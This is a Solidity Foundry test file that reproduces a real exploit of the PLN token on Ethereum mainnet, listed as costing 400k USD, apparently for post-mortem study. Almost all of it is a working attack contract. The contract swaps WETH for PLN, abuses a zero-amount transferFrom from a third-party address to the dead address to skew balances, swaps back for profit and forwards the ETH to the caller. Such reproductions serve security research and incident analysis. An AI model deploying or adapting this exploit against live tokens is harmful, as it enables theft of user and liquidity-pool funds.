pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 400k USD
// Attacker : https://etherscan.io/address/0x67404bcd629E920100c594d62f3678340F40D95a
// Attack Contract : https://etherscan.io/address/0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C
// Vulnerable Contract : https://etherscan.io/address/0xe0c218e1633a5c76d57ff4f11149f07bfff16aea
// Attack Tx : https://etherscan.io/tx/0xcc36283cee837a8a0d4af0357d1957dc561913e44ad293ea9da8acf15d874ed5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xe0c218e1633a5c76d57ff4f11149f07bfff16aea

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1831525062253654300
// Twitter Guy : https://x.com/TenArmorAlert/status/1831525062253654300
// Hacking God : N/A


address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant PLNTOKEN = 0xe0c218e1633A5C76d57Ff4f11149F07BfFF16aeA;
address constant addr = 0x3f5a63B89773986Fd436a65884fcD321DE77B832;
address constant attacker = 0x67404bcd629E920100c594d62f3678340F40D95a;
address constant dead = 0x000000000000000000000000000000000000dEaD;


contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20681142);
        deal(attacker, 0.9 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack{value: 0.9 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0xbe01c53AD466Ef011e3f8A67F6e23C34E2e9976C
contract AttackerC {
    receive() external payable {}

    function attack() public payable {
        // WETH deposit with msg.value
        IWETH9(weth9).deposit{value: msg.value}();

        // Approvals
        IWETH9(weth9).approve(UniswapV2Router02, type(uint256).max);
        IPLNTOKEN(PLNTOKEN).approve(UniswapV2Router02, type(uint256).max);

        // Swap WETH -> PLN using amountIn = msg.value
        address[] memory path1 = new address[](2);
        path1[0] = weth9;
        path1[1] = PLNTOKEN;
        IUniswapV2Router02(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            msg.value,
            0,
            path1,
            address(this),
            block.timestamp
        );

        // transferFrom(addr -> dead, 0)
        IPLNTOKEN(PLNTOKEN).transferFrom(addr, dead, 0);

        // balanceOf(this)
        uint256 balPLN = IPLNTOKEN(PLNTOKEN).balanceOf(address(this));

        // Swap PLN -> WETH using amountIn = balPLN
        address[] memory path2 = new address[](2);
        path2[0] = PLNTOKEN;
        path2[1] = weth9;
        IUniswapV2Router02(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balPLN,
            0,
            path2,
            address(this),
            block.timestamp
        );

        // WETH balance and withdraw
        uint256 balWETH = IWETH9(weth9).balanceOf(address(this));
        IWETH9(weth9).withdraw(balWETH);

        // send all ETH to tx.origin per trace (caller in decompile)
        payable(tx.origin).call{value: address(this).balance}("");
    }
  
    fallback() external payable {}
}

interface IWETH9 {
	function balanceOf(address) external view returns (uint256);
	function withdraw(uint256) external;
	function approve(address, uint256) external returns (bool);
	function deposit() external payable; 
}
interface IUniswapV2Router02 {
	function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256) external; 
}
interface IPLNTOKEN {
	function transferFrom(address, address, uint256) external returns (bool);
	function balanceOf(address) external view returns (uint256);
	function approve(address, uint256) external returns (bool); 
}